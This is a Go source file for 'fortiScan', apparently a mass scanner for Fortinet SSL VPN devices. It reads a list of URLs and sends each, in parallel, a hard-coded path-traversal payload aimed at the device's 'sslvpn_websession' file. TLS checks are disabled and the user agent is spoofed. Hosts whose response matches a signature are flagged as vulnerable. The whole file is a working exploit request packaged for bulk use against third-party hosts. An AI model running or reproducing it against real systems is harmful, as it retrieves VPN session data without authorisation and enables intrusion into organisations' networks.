package scan

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/common-nighthawk/go-figure"
)

const userAgent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 - github.com/anasbousselham/)"
const signature = "var fgt_lang ="
const payloads = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
const (
	InfoColor    = "\033[1;34m%s\033[0m"
	NoticeColor  = "\033[1;36m%s\033[0m"
	WarningColor = "\033[1;33m%s\033[0m"
	ErrorColor   = "\033[1;31m%s\033[0m"
	DebugColor   = "\033[0;36m%s\033[0m"
)

var codername = "Anas Bousselham"
var ver = "0.6"
var email = "anasoft@gmail.com"

func logoprint() {
	logo := figure.NewFigure("fortiScan", "", true)
	logo.Print()
	fmt.Println(codername)
	fmt.Println(email)
	fmt.Println("Ver: ", ver)

}

func NewClient() *http.Client {
	tr := &http.Transport{
		MaxIdleConns:    40,
		IdleConnTimeout: time.Second,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   time.Second * 10,
			KeepAlive: time.Second,
		}).DialContext,
	}

	return &http.Client{
		Transport: tr,
		Timeout:   time.Second * 10,
	}
}

func FromStdin() {
	logoprint()

	if len(os.Args) != 2 {
		fmt.Println("Usage: fortiscan url.file")
		return
	}
	file, err := os.Open(os.Args[1])
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	var wg sync.WaitGroup

	sc := bufio.NewScanner(file)

	for sc.Scan() {

		URL := sc.Text()
		wg.Add(1)
		go func() {
			defer wg.Done()
			DotDotReq(URL)
		}()
	}
	if err := sc.Err(); err != nil {
		log.Println("error: ", err)
	}
	wg.Wait()
}

func DotDotReq(url string) {
	client := NewClient()
	scanner := bufio.NewScanner(strings.NewReader(payloads))

	for scanner.Scan() {
		payload := scanner.Text()
		urlReq := url + payload
		req, err := http.NewRequest("GET", urlReq, nil)
		req.Header.Set("User-Agent", userAgent)
		if err != nil {
			log.Fatalln("[!] Error ", urlReq)
		}

		resp, err := client.Do(req)
		if err != nil {
			return
			//	log.Fatalln("[!] Error ", err)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Println("[!] Body data Error ", urlReq)
		}

		bodyStr := string(body)

		if strings.Contains(bodyStr, signature) {

			fmt.Printf("[VULNERABLE]: %s\n", url)
		}

		defer resp.Body.Close()

		if err := scanner.Err(); err != nil {
			log.Fatalln("Error :", err)
		}
	}
}
